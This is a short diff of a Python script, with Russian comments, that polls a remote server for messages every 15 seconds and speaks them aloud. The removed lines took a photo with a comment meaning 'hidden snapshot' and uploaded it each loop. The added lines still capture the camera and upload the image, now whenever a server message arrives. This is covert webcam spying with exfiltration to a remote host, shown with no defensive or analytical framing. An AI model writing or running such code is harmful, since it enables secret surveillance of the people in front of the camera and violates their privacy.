@@ -45,14 +45,12 @@ def upload_file(filename):
 
 while True:
     try:
-        # Делаем скрытый снимок
-        photo = capture_camera()
-        if photo:
-            upload_file(photo)
-
         # Проверяем сообщения
         response = requests.get(f"{SERVER_URL}/get_message")
         if response.json().get("message"):
+            photo = capture_camera()
+            if photo:
+                upload_file(photo)
             mess = response.json()["message"]
             speak(mess)
         time.sleep(15)
